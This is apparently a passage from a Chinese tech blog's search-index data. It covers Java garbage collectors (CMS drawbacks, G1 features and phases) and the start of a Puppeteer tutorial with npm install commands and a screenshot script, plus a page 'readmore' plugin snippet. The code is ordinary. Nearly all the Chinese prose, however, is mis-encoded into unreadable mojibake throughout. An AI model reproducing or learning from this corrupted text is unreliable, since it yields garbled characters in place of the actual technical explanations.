å¹¶å‘ä½åœé¡¿æ”¶é›†å™¨â€ï¼ˆConcurrent Low Pause Collectorï¼‰ã€‚ ç¼ºç‚¹ï¼š CMS æ”¶é›†å™¨å¯¹ CPU èµ„æºéå¸¸æ•æ„Ÿï¼Œå…¶å®é¢å‘å¹¶å‘è®¾è®¡çš„ç¨‹åºéƒ½å¯¹ CPU èµ„æºæ¯”è¾ƒæ•æ„Ÿã€‚åœ¨å¹¶å‘é˜¶æ®µï¼Œå®ƒè™½ç„¶ä¸ä¼šå¯¼è‡´ç”¨æˆ·çº¿ç¨‹åœé¡¿ï¼Œä½†æ˜¯ä¼šå› ä¸ºå ç”¨äº†ä¸€éƒ¨åˆ†çº¿ç¨‹ï¼ˆæˆ–è€…è¯´ CPU èµ„æºï¼‰è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå˜æ…¢ï¼Œæ€»ååé‡ä¼šé™ä½ã€‚CMS é»˜è®¤å¯åŠ¨çš„å›æ”¶çº¿ç¨‹æ•°æ˜¯ï¼ˆCPU æ•°é‡ + 3ï¼‰/ 4ï¼Œä¹Ÿå°±æ˜¯å½“ CPU åœ¨ 4 ä¸ªä»¥ä¸Šæ—¶ï¼Œå¹¶å‘å›æ”¶æ—¶åƒåœ¾æ”¶é›†çº¿ç¨‹ä¸å°‘äº 25% çš„ CPU èµ„æºï¼Œå¹¶ä¸”éšç€ CPU æ•°é‡çš„å¢åŠ è€Œä¸‹é™ã€‚ä½†æ˜¯å½“ CPU ä¸è¶³ 4 ä¸ªï¼ˆä¾‹å¦‚ 2 ä¸ªï¼‰æ—¶ï¼ŒCMS å¯¹ç”¨æˆ·ç¨‹åºçš„å½±å“å°±å¯èƒ½å˜å¾—å¾ˆå¤§ã€‚ CMS æ”¶é›†å™¨æ— æ³•å¤„ç†æµ®åŠ¨åƒåœ¾ï¼Œå¯èƒ½å‡ºç° â€œConcurrent Mode Failureâ€ å¤±è´¥è€Œå¯¼è‡´å¦ä¸€æ¬¡ Full GC çš„äº§ç”Ÿã€‚ç”±äº CMS å¹¶å‘æ¸…ç†é˜¶æ®µç”¨æˆ·çº¿ç¨‹è¿˜åœ¨è¿è¡Œç€ï¼Œä¼´éšç¨‹åºè¿è¡Œè‡ªç„¶å°±è¿˜ä¼šæœ‰æ–°çš„åƒåœ¾ä¸æ–­äº§ç”Ÿï¼Œè¿™ä¸€éƒ¨åˆ†åƒåœ¾å‡ºç°åœ¨æ ‡è®°è¿‡ç¨‹ä¹‹åï¼ŒCMS æ— æ³•åœ¨å½“æ¬¡æ”¶é›†ä¸­å¤„ç†æ‰å®ƒä»¬ï¼Œåªå¥½ç•™å¾…ä¸‹ä¸€æ¬¡ GC æ—¶å†æ¸…ç†æ‰ï¼Œè¿™ä¸€éƒ¨åˆ†åƒåœ¾å°±ç§°ä¸º â€œæµ®åŠ¨åƒåœ¾â€ã€‚ä¹Ÿæ˜¯ç”±äºåœ¨åƒåœ¾æ”¶é›†é˜¶æ®µç”¨æˆ·çº¿ç¨‹è¿˜éœ€è¦è¿è¡Œï¼Œé‚£ä¹Ÿå°±è¿˜éœ€è¦é¢„ç•™æœ‰è¶³å¤Ÿçš„å†…å­˜ç©ºé—´ç»™ç”¨æˆ·çº¿ç¨‹ä½¿ç”¨ï¼Œå› æ­¤ CMS æ”¶é›†å™¨ä¸èƒ½åƒå…¶ä»–æ”¶é›†å™¨é‚£æ ·ç­‰åˆ°è€å¹´ä»£å‡ ä¹å®Œå…¨è¢«å¡«æ»¡äº†å†è¿›è¡Œæ”¶é›†ï¼Œéœ€è¦é¢„ç•™ä¸€éƒ¨åˆ†ç©ºé—´æä¾›å¹¶å‘æ”¶é›†æ—¶çš„ç¨‹åºè¿ä½œä½¿ç”¨ã€‚è¦æ˜¯ CMS è¿è¡ŒæœŸé—´é¢„ç•™çš„å†…å­˜æ— æ³•æ»¡è¶³ç¨‹åºéœ€è¦ï¼Œå°±ä¼šå‡ºç°ä¸€æ¬¡ â€œConcurrent Mode Failureâ€ å¤±è´¥ï¼Œè¿™æ—¶è™šæ‹Ÿæœºå°†å¯åŠ¨åå¤‡é¢„æ¡ˆï¼šä¸´æ—¶å¯ç”¨ Serial Old æ”¶é›†å™¨æ¥é‡æ–°è¿›è¡Œè€å¹´ä»£çš„åƒåœ¾æ”¶é›†ï¼ˆFull GCï¼‰ï¼Œè¿™æ ·åœé¡¿æ—¶é—´å°±å¾ˆé•¿äº†ã€‚ CMS æ”¶é›†å™¨ä¼šäº§ç”Ÿå¤§é‡ç©ºé—´ç¢ç‰‡ï¼ŒCMS æ˜¯ä¸€æ¬¾åŸºäº â€œæ ‡è®° - æ¸…é™¤â€ ç®—æ³•å®ç°çš„æ”¶é›†å™¨ï¼Œè¿™æ„å‘³ç€æ”¶é›†ç»“æŸæ—¶ä¼šæœ‰å¤§é‡ç©ºé—´ç¢ç‰‡äº§ç”Ÿã€‚ç©ºé—´ç¢ç‰‡è¿‡å¤šæ—¶ï¼Œå°†ä¼šç»™å¤§å¯¹è±¡åˆ†é…å¸¦æ¥å¾ˆå¤§éº»çƒ¦ï¼Œå¾€å¾€ä¼šå‡ºç°è€å¹´ä»£è¿˜æœ‰å¾ˆå¤§ç©ºé—´å‰©ä½™ï¼Œä½†æ˜¯æ— æ³•æ‰¾åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜ç©ºé—´æ¥åˆ†é…å½“å‰å¯¹è±¡ï¼Œå¯¼è‡´ä¸å¾—ä¸æå‰è§¦å‘ä¸€æ¬¡ Full GCã€‚ G1 æ”¶é›†å™¨ G1ï¼ˆGarbage-Firstï¼‰æ”¶é›†å™¨æ˜¯å½“ä»Šæ”¶é›†å™¨æŠ€æœ¯å‘å±•æœ€å‰æ²¿çš„æˆæœä¹‹ä¸€ï¼Œå®ƒæ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡ç«¯åº”ç”¨çš„åƒåœ¾æ”¶é›†å™¨ï¼ŒHotSpot å¼€å‘å›¢é˜Ÿèµ‹äºˆå®ƒçš„ä½¿å‘½æ˜¯ï¼ˆåœ¨æ¯”è¾ƒé•¿æœŸçš„ï¼‰æœªæ¥å¯ä»¥æ›¿æ¢æ‰ JDK 1.5 ä¸­å‘å¸ƒçš„ CMS æ”¶é›†å™¨ã€‚ ç‰¹æ€§ï¼š å¹¶è¡Œä¸å¹¶å‘ï¼šG1 èƒ½å……åˆ†åˆ©ç”¨å¤š CPUã€å¤šæ ¸ç¯å¢ƒä¸‹çš„ç¡¬ä»¶ä¼˜åŠ¿ï¼Œä½¿ç”¨å¤šä¸ª CPU æ¥ç¼©çŸ­ Stop-The-World åœé¡¿çš„æ—¶é—´ï¼Œéƒ¨åˆ†å…¶ä»–æ”¶é›†å™¨éœ€è¦åœé¡¿ Java çº¿ç¨‹æ¥æ‰§è¡Œçš„ GC åŠ¨ä½œï¼Œè€Œ G1 æ”¶é›†å™¨ä»ç„¶å¯ä»¥é€šè¿‡å¹¶å‘çš„æ–¹å¼è®© Java ç¨‹åºç»§ç»­æ‰§è¡Œã€‚ åˆ†ä»£æ”¶é›†ï¼šä¸å…¶ä»–æ”¶é›†å™¨ä¸€æ ·ï¼Œåˆ†ä»£æ¦‚å¿µåœ¨ G1 ä¸­ä¾ç„¶å¾—ä»¥ä¿ç•™ã€‚è™½ç„¶ G1 å¯ä»¥ä¸éœ€è¦å…¶ä»–æ”¶é›†å™¨é…åˆå°±èƒ½ç‹¬ç«‹ç®¡ç†æ•´ä¸ª GC å †ï¼Œä½†å®ƒèƒ½å¤Ÿé‡‡ç”¨ä¸åŒçš„æ–¹å¼å»å¤„ç†æ–°åˆ›å»ºçš„å¯¹è±¡å’Œå·²ç»å­˜æ´»äº†ä¸€æ®µæ—¶é—´ã€ç†¬è¿‡å¤šæ¬¡ GC çš„æ—§å¯¹è±¡ä»¥è·å–æ›´å¥½çš„æ”¶é›†æ•ˆæœã€‚ ç©ºé—´æ•´åˆï¼šä¸ CMS çš„ â€œæ ‡è®° - æ¸…é™¤â€ ç®—æ³•ä¸åŒï¼ŒG1 ä»æ•´ä½“æ¥çœ‹æ˜¯åŸºäº â€œæ ‡è®° - æ•´ç†â€ ç®—æ³•å®ç°çš„æ”¶é›†å™¨ï¼Œä»å±€éƒ¨ï¼ˆä¸¤ä¸ª Region ä¹‹é—´ï¼‰ä¸Šæ¥çœ‹æ˜¯åŸºäº â€œå¤åˆ¶â€ ç®—æ³•å®ç°çš„ï¼Œä½†æ— è®ºå¦‚ä½•ï¼Œè¿™ä¸¤ç§ç®—æ³•éƒ½æ„å‘³ç€ G1 è¿ä½œæœŸé—´ä¸ä¼šäº§ç”Ÿå†…å­˜ç©ºé—´ç¢ç‰‡ï¼Œæ”¶é›†åèƒ½æä¾›è§„æ•´çš„å¯ç”¨å†…å­˜ã€‚è¿™ç§ç‰¹æ€§æœ‰åˆ©äºç¨‹åºé•¿æ—¶é—´è¿è¡Œï¼Œåˆ†é…å¤§å¯¹è±¡æ—¶ä¸ä¼šå› ä¸ºæ— æ³•æ‰¾åˆ°è¿ç»­å†…å­˜ç©ºé—´è€Œæå‰è§¦å‘ä¸‹ä¸€æ¬¡ Full GCã€‚ å¯é¢„æµ‹çš„åœé¡¿ï¼šè¿™æ˜¯ G1 ç›¸å¯¹äº CMS çš„å¦ä¸€å¤§ä¼˜åŠ¿ï¼Œé™ä½åœé¡¿æ—¶é—´æ˜¯ G1 å’Œ CMS å…±åŒçš„å…³æ³¨ç‚¹ï¼Œä½† G1 é™¤äº†è¿½æ±‚ä½åœé¡¿å¤–ï¼Œè¿˜èƒ½å»ºç«‹å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹ï¼Œèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸º M æ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨åƒåœ¾æ”¶é›†ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡ N æ¯«ç§’ã€‚ æ¨ªè·¨æ•´ä¸ªå †å†…å­˜ï¼šåœ¨ G1 ä¹‹å‰çš„å…¶ä»–æ”¶é›†å™¨è¿›è¡Œæ”¶é›†çš„èŒƒå›´éƒ½æ˜¯å•ç‹¬é’ˆå¯¹æ–°ç”Ÿä»£æˆ–è€…è€å¹´ä»£ï¼Œè€Œ G1 ä¸å†æ˜¯è¿™æ ·ã€‚ä½¿ç”¨ G1 æ”¶é›†å™¨æ—¶ï¼ŒJava å †çš„å†…å­˜å¸ƒå±€å°±ä¸å…¶ä»–æ”¶é›†å™¨æœ‰å¾ˆå¤§å·®åˆ«ï¼Œå®ƒå°†æ•´ä¸ª Java å †åˆ’åˆ†ä¸ºå¤šä¸ªå¤§å°ç›¸ç­‰çš„ç‹¬ç«‹åŒºåŸŸï¼ˆRegionï¼‰ï¼Œè™½ç„¶è¿˜ä¿ç•™æœ‰æ–°ç”Ÿä»£å’Œè€å¹´ä»£çš„æ¦‚å¿µï¼Œä½†æ–°ç”Ÿä»£å’Œè€å¹´ä»£ä¸å†æ˜¯ç‰©ç†éš”ç¦»çš„äº†ï¼Œå®ƒä»¬éƒ½æ˜¯ä¸€éƒ¨åˆ† Regionï¼ˆä¸éœ€è¦è¿ç»­ï¼‰çš„é›†åˆã€‚ å»ºç«‹å¯é¢„æµ‹çš„æ—¶é—´æ¨¡å‹ï¼šG1 æ”¶é›†å™¨ä¹‹æ‰€ä»¥èƒ½å»ºç«‹å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹ï¼Œæ˜¯å› ä¸ºå®ƒå¯ä»¥æœ‰è®¡åˆ’åœ°é¿å…åœ¨æ•´ä¸ª Java å †ä¸­è¿›è¡Œå…¨åŒºåŸŸçš„åƒåœ¾æ”¶é›†ã€‚G1 è·Ÿè¸ªå„ä¸ª Region é‡Œé¢çš„åƒåœ¾å †ç§¯çš„ä»·å€¼å¤§å°ï¼ˆå›æ”¶æ‰€è·å¾—çš„ç©ºé—´å¤§å°ä»¥åŠå›æ”¶æ‰€éœ€æ—¶é—´çš„ç»éªŒå€¼ï¼‰ï¼Œåœ¨åå°ç»´æŠ¤ä¸€ä¸ªä¼˜å…ˆåˆ—è¡¨ï¼Œæ¯æ¬¡æ ¹æ®å…è®¸çš„æ”¶é›†æ—¶é—´ï¼Œä¼˜å…ˆå›æ”¶ä»·å€¼æœ€å¤§çš„ Regionï¼ˆè¿™ä¹Ÿå°±æ˜¯ Garbage-First åç§°çš„æ¥ç”±ï¼‰ã€‚è¿™ç§ä½¿ç”¨ Region åˆ’åˆ†å†…å­˜ç©ºé—´ä»¥åŠæœ‰ä¼˜å…ˆçº§çš„åŒºåŸŸå›æ”¶æ–¹å¼ï¼Œä¿è¯äº† G1 æ”¶é›†å™¨åœ¨æœ‰é™çš„æ—¶é—´å†…å¯ä»¥è·å–å°½å¯èƒ½é«˜çš„æ”¶é›†æ•ˆç‡ã€‚ é¿å…å…¨å †æ‰«æ - Remembered Setï¼šG1 æŠŠ Java å †åˆ†ä¸ºå¤šä¸ª Regionï¼Œå°±æ˜¯ â€œåŒ–æ•´ä¸ºé›¶â€ã€‚ä½†æ˜¯ Region ä¸å¯èƒ½æ˜¯å­¤ç«‹çš„ï¼Œä¸€ä¸ªå¯¹è±¡åˆ†é…åœ¨æŸä¸ª Region ä¸­ï¼Œå¯ä»¥ä¸æ•´ä¸ª Java å †ä»»æ„çš„å¯¹è±¡å‘ç”Ÿå¼•ç”¨å…³ç³»ã€‚åœ¨åšå¯è¾¾æ€§åˆ†æç¡®å®šå¯¹è±¡æ˜¯å¦å­˜æ´»çš„æ—¶å€™ï¼Œéœ€è¦æ‰«ææ•´ä¸ª Java å †æ‰èƒ½ä¿è¯å‡†ç¡®æ€§ï¼Œè¿™æ˜¾ç„¶æ˜¯å¯¹ GC æ•ˆç‡çš„æå¤§ä¼¤å®³ã€‚ä¸ºäº†é¿å…å…¨å †æ‰«æçš„å‘ç”Ÿï¼Œè™šæ‹Ÿæœºä¸º G1 ä¸­æ¯ä¸ª Region ç»´æŠ¤äº†ä¸€ä¸ªä¸ä¹‹å¯¹åº”çš„ Remembered Setã€‚è™šæ‹Ÿæœºå‘ç°ç¨‹åºåœ¨å¯¹ Reference ç±»å‹çš„æ•°æ®è¿›è¡Œå†™æ“ä½œæ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ª Write Barrier æš‚æ—¶ä¸­æ–­å†™æ“ä½œï¼Œæ£€æŸ¥ Reference å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦å¤„äºä¸åŒçš„ Region ä¹‹ä¸­ï¼ˆåœ¨åˆ†ä»£çš„ä¾‹å­ä¸­å°±æ˜¯æ£€æŸ¥æ˜¯å¦è€å¹´ä»£ä¸­çš„å¯¹è±¡å¼•ç”¨äº†æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡ï¼‰ï¼Œå¦‚æœæ˜¯ä¾¿é€šè¿‡ CardTable æŠŠç›¸å…³å¼•ç”¨ä¿¡æ¯è®°å½•åˆ°è¢«å¼•ç”¨å¯¹è±¡æ‰€å±çš„ Region çš„ Remembered Set ä¹‹ä¸­ã€‚å½“è¿›è¡Œå†…å­˜å›æ”¶æ—¶ï¼Œåœ¨ GC æ ¹èŠ‚ç‚¹çš„æšä¸¾èŒƒå›´ä¸­åŠ å…¥ Remembered Set å³å¯ä¿è¯ä¸å¯¹å…¨å †æ‰«æä¹Ÿä¸ä¼šæœ‰é—æ¼ã€‚ æ‰§è¡Œè¿‡ç¨‹ï¼š åˆå§‹æ ‡è®°ï¼ˆInitial Markingï¼‰ï¼šåˆå§‹æ ‡è®°é˜¶æ®µä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹ GC Roots èƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œå¹¶ä¸”ä¿®æ”¹ TAMSï¼ˆNext Top at Mark Startï¼‰çš„å€¼ï¼Œè®©ä¸‹ä¸€é˜¶æ®µç”¨æˆ·ç¨‹åºå¹¶å‘è¿è¡Œæ—¶ï¼Œèƒ½åœ¨æ­£ç¡®å¯ç”¨çš„ Region ä¸­åˆ›å»ºæ–°å¯¹è±¡ï¼Œè¿™é˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†è€—æ—¶å¾ˆçŸ­ã€‚ å¹¶å‘æ ‡è®°ï¼ˆConcurrent Markingï¼‰ï¼šå¹¶å‘æ ‡è®°é˜¶æ®µæ˜¯ä» GC Root å¼€å§‹å¯¹å †ä¸­å¯¹è±¡è¿›è¡Œå¯è¾¾æ€§åˆ†æï¼Œæ‰¾å‡ºå­˜æ´»çš„å¯¹è±¡ï¼Œè¿™é˜¶æ®µè€—æ—¶è¾ƒé•¿ï¼Œä½†å¯ä¸ç”¨æˆ·ç¨‹åºå¹¶å‘æ‰§è¡Œã€‚ æœ€ç»ˆæ ‡è®°ï¼ˆFinal Markingï¼‰ï¼šæœ€ç»ˆæ ‡è®°é˜¶æ®µæ˜¯ä¸ºäº†ä¿®æ­£åœ¨å¹¶å‘æ ‡è®°æœŸé—´å› ç”¨æˆ·ç¨‹åºç»§ç»­è¿ä½œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†æ ‡è®°è®°å½•ï¼Œè™šæ‹Ÿæœºå°†è¿™æ®µæ—¶é—´å¯¹è±¡å˜åŒ–è®°å½•åœ¨çº¿ç¨‹ Remembered Set Logs é‡Œé¢ï¼Œæœ€ç»ˆæ ‡è®°é˜¶æ®µéœ€è¦æŠŠ Remembered Set Logs çš„æ•°æ®åˆå¹¶åˆ° Remembered Set ä¸­ï¼Œè¿™é˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†æ˜¯å¯å¹¶è¡Œæ‰§è¡Œã€‚ ç­›é€‰å›æ”¶ï¼ˆLive Data Counting and Evacuationï¼‰ï¼šç­›é€‰å›æ”¶é˜¶æ®µé¦–å…ˆå¯¹å„ä¸ª Region çš„å›æ”¶ä»·å€¼å’Œæˆæœ¬è¿›è¡Œæ’åºï¼Œæ ¹æ®ç”¨æˆ·æ‰€æœŸæœ›çš„ GC åœé¡¿æ—¶é—´æ¥åˆ¶å®šå›æ”¶è®¡åˆ’ï¼Œè¿™ä¸ªé˜¶æ®µå…¶å®ä¹Ÿå¯ä»¥åšåˆ°ä¸ç”¨æˆ·ç¨‹åºä¸€èµ·å¹¶å‘æ‰§è¡Œï¼Œä½†æ˜¯å› ä¸ºåªå›æ”¶ä¸€éƒ¨åˆ† Regionï¼Œæ—¶é—´æ˜¯ç”¨æˆ·å¯æ§åˆ¶çš„ï¼Œè€Œä¸”åœé¡¿ç”¨æˆ·çº¿ç¨‹å°†å¤§å¹…æé«˜æ”¶é›†æ•ˆç‡ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Puppeteer å…¥é—¨ä½¿ç”¨æ•™ç¨‹",url:"/posts/1a44388b.html",text:'Puppeteer ä»‹ç»Puppeteer æ˜¯ä»€ä¹ˆPuppeteer æ˜¯ä¸€ä¸ª NodeJs åº“ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªé«˜çº§ API æ¥é€šè¿‡ DevTools åè®®æ§åˆ¶ Chromium æˆ– Chromeã€‚ç›¸æ¯”è¾ƒ Selenium æˆ–æ˜¯ PhantomJsï¼Œå®ƒæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å®Œå…¨å¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿ DOM æ“ä½œï¼Œå³åœ¨ V8 å¼•æ“ä¸­å¤„ç†è€Œä¸æ‰“å¼€æµè§ˆå™¨ï¼Œè€Œä¸”å…³é”®çš„æ˜¯è¯¥é¡¹ç›®æ˜¯ Chrome å›¢é˜Ÿåœ¨ç»´æŠ¤ï¼Œä¼šæ‹¥æœ‰æ›´å¥½çš„å…¼å®¹æ€§å’Œå‰æ™¯ï¼Œæ›´å¤šèµ„æ–™å¯å‚è€ƒä»¥ä¸‹ç«™ç‚¹ï¼šPuppeteer Githubã€Puppeteer ä¸­æ–‡æ–‡æ¡£ã€DevTools Protocol æ–‡æ¡£ã€Chromium å‘½ä»¤è¡Œå¯åŠ¨å‚æ•°ã€‚ Puppeteer çš„åŠŸèƒ½ ç”Ÿæˆé¡µé¢çš„æˆªå›¾å’Œ PDF è‡ªåŠ¨æäº¤è¡¨å•ï¼Œè¿›è¡Œ UI æµ‹è¯•ï¼Œé”®ç›˜è¾“å…¥ç­‰ æ•è·ç½‘ç«™çš„æ—¶é—´çº¿è·Ÿè¸ªï¼Œç”¨æ¥å¸®åŠ©åˆ†ææ€§èƒ½é—®é¢˜ æŠ“å– SPAï¼ˆå•é¡µåº”ç”¨ï¼‰ï¼Œå¹¶ç”Ÿæˆé¢„æ¸²æŸ“å†…å®¹ï¼Œå³ â€œSSRâ€ï¼ˆæœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼‰ åˆ›å»ºä¸€ä¸ªæœ€æ–°çš„è‡ªåŠ¨åŒ–æµ‹è¯•ç¯å¢ƒï¼Œä½¿ç”¨æœ€æ–°çš„ JavaScript å’Œæµè§ˆå™¨åŠŸèƒ½ï¼Œç›´æ¥åœ¨æœ€æ–°ç‰ˆæœ¬çš„ Chrome ä¸­è¿è¡Œæµ‹è¯• æµ‹è¯•æµè§ˆå™¨æ‰©å±•ï¼ŒChrome / Chromium æ‰©å±•å½“å‰åªèƒ½åœ¨éæ— å¤´æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œç›®å‰è¿˜æ— æ³•æµ‹è¯•æ‰©å±•å¼¹å‡ºçª—å£æˆ–å†…å®¹è„šæœ¬ Puppeteer VS Puppeteer-Coreä½¿ç”¨åŒºåˆ«è‡ª v1.7.0 ä»¥æ¥çš„ Puppeteer æ¯ä¸ªç‰ˆæœ¬éƒ½ä¼šå‘å¸ƒä¸¤ä¸ªåŒ…ï¼špuppeteerã€puppeteer-coreï¼Œä¸¤è€…çš„åŒºåˆ«å¦‚ä¸‹ï¼š puppeteer æ˜¯æµè§ˆå™¨è‡ªåŠ¨åŒ–çš„äº§å“ï¼Œå®‰è£…åå®ƒä¼šä¸‹è½½ä¸€ä¸ªæœ€æ–°ç‰ˆæœ¬çš„ Chromiumï¼Œç„¶åä½¿ç”¨ puppeteer-core é©±åŠ¨å·¥ä½œã€‚ä½œä¸ºæœ€ç»ˆç”¨æˆ·äº§å“ï¼Œpuppeteer æ”¯æŒä¸€å †æ–¹ä¾¿çš„ PUPPETEER_* ç¯å¢ƒå˜é‡æ¥è°ƒæ•´è¿è¡Œè¡Œä¸º puppeteer-core æ˜¯ä¸€ä¸ªåº“æ¥å¸®åŠ©é©±åŠ¨ä»»ä½•æ”¯æŒ DevTools åè®®çš„ä¸œè¥¿ã€‚puppeteer-core åœ¨å®‰è£…æ—¶ä¸ä¼šä¸‹è½½ Chromiumï¼Œä½œä¸ºä¸€ä¸ªåº“ï¼Œpuppeteer-core å®Œå…¨æ˜¯é€šè¿‡å…¶ç¼–ç¨‹æ¥å£é©±åŠ¨çš„ï¼Œå¹¶ä¸”ä¼šå¿½ç•¥æ‰€æœ‰ PUPPETEER_* ç¯å¢ƒå˜é‡ ä½¿ç”¨å»ºè®®åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ puppeteer åŒ…ï¼Œå¦‚æœæ˜¯ä¸‹é¢è¿™äº›æƒ…å†µï¼Œé‚£å¯ä»¥ä½¿ç”¨ puppeteer-coreï¼š æ­£åœ¨æ„å»ºä½¿ç”¨ DevTools åè®®çš„å¦ä¸€ä¸ªæœ€ç»ˆç”¨æˆ·äº§å“æˆ–åº“ï¼›ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ puppeteer-core æ„å»º PDF ç”Ÿæˆå™¨ï¼Œå¹¶ç¼–å†™ä¸‹è½½ headless_shell çš„è‡ªå®šä¹‰ install.js è„šæœ¬ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ Chromium æ¥èŠ‚çœç£ç›˜ç©ºé—´ æ­£åœ¨æ‰“åŒ… Puppeteer ç”¨åœ¨ Chrome ä¸Šçš„æ‰©å±•åº”ç”¨æˆ–è€…æµè§ˆå™¨ä¸­ä»¥ä½¿ç”¨ DevTools åè®®ï¼Œå› ä¸ºä¸‹è½½é¢å¤–çš„ Chromium äºŒè¿›åˆ¶æ–‡ä»¶ä¸æ˜¯å¿…é¡»çš„ å½“éœ€è¦ä½¿ç”¨ puppeteer-core æ—¶ï¼Œä½¿ç”¨ä¸‹é¢è¿™è¡Œä»£ç ä»£æ›¿åŸæ¥çš„å¼•å…¥æ–¹å¼å³å¯ï¼š 1const puppeteer = require(\'puppeteer-core\'); Puppeteer è¿è¡Œç¯å¢ƒä¸å®‰è£…Puppeteer è¿è¡Œç¯å¢ƒPuppeteer è¿è¡Œä¾èµ–äº NodeJs v6.4.0+ï¼Œå¦‚æœè¦ä½¿ç”¨ async /awaitï¼Œåªæœ‰ NodeJs v7.6.0 æˆ–æ›´é«˜ç‰ˆæœ¬æ‰æ”¯æŒï¼ŒNodeJs å¯ä»¥ç‚¹å‡»è¿™é‡Œä¸‹è½½ã€‚ Puppeteer å®‰è£…Puppeteer å®‰è£…çš„è¿‡ç¨‹é»˜è®¤ä¼šæ‰§è¡Œ install.js è„šæœ¬æ¥ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ Chromiumï¼ˆè¯·è‡ªå¤‡æ¢¯å­ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ --ignore-scripts å‚æ•°è·³è¿‡ Chromium çš„ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡ PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1 æ¥è·³è¿‡ä¸‹è½½ã€‚ 12345# å®‰è£…puppeteer$ npm install puppeteer -g --ignore-scripts# æˆ–è€…ä½¿ç”¨æ·˜å®é•œåƒæºå®‰è£…puppeteer$ npm install puppeteer -g --ignore-scripts --registry=https://registry.npm.taobao.org æ‰‹åŠ¨ä¸‹è½½ Chromium å¹¶è§£å‹åœ¨æœ¬åœ°ç£ç›˜ï¼Œä¸‹è½½å¯ä»¥ç‚¹å‡»è¿™é‡Œï¼ˆè¯·è‡ªå¤‡æ¢¯å­ï¼‰ï¼š Puppeteer å…¥é—¨æ¡ˆä¾‹å…¥é—¨æ¡ˆä¾‹åˆå§‹åŒ–é¡¹ç›®ï¼š 1$ npm init åˆ›å»º index.js æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼ŒexecutablePath æ˜¯ Chromium æˆ–è€… Chrome å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼š 123456789101112const puppeteer = require(\'puppeteer\');(async () =&gt; { const browser = await puppeteer.launch({ executablePath: \'/usr/bin/google-chrome-stable\', headless: false }); const page = await browser.newPage(); await page.goto(\'http://www.baidu.com/\'); await page.screenshot({path: \'baidu.png\'}); browser.close();})(); æ‰§è¡Œ index.js è„šæœ¬ï¼Œè¿è¡ŒæˆåŠŸåï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆç½‘é¡µçš„æˆªå›¾æ–‡ä»¶ baidu.pngï¼š 1$ node index.js å¯åŠ¨å‚æ•°Puppeteer Launch çš„å¯åŠ¨å‚æ•°å¦‚ä¸‹ï¼š executablePathï¼šChromium æˆ– Chrome å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ headlessï¼šæ˜¯å¦è¿è¡Œåœ¨æµè§ˆå™¨ headless æ¨¡å¼ï¼Œtrue è¡¨ç¤ºä¸æ‰“å¼€æµè§ˆå™¨æ‰§è¡Œï¼Œé»˜è®¤ä¸º true timeoutï¼šç­‰å¾…æµè§ˆå™¨å®ä¾‹å¯åŠ¨çš„æœ€é•¿æ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ï¼Œé»˜è®¤ä¸º 30000ï¼Œå½“å€¼ä¸º 0 æ—¶è¡¨ç¤ºç¦ç”¨è¶…æ—¶ argsï¼šä¼ é€’ç»™æµè§ˆå™¨å®ä¾‹çš„å…¶ä»–å‚æ•° Puppeteer å®æˆ˜Puppeteer ç¯å¢ƒå˜é‡Puppeteer çš„ç¯å¢ƒå˜é‡å¦‚ä¸‹ï¼Œåœ¨ä½¿ç”¨ puppeteer-core æ—¶ï¼Œä¸‹è¿°ç¯å¢ƒå˜é‡ä¸­ä»¥ PUPPETEER_* å¼€å¤´çš„ä¼šè¢«å¿½ç•¥ï¼š HTTP_PROXYã€HTTPS_PROXY, NO_PROXY - å®šä¹‰ç”¨äºä¸‹è½½å’Œè¿è¡Œ Chromium çš„ HTTP ä»£ç†è®¾ç½® PUPPETEER_SKIP_CHROMIUM_DOWNLOAD - 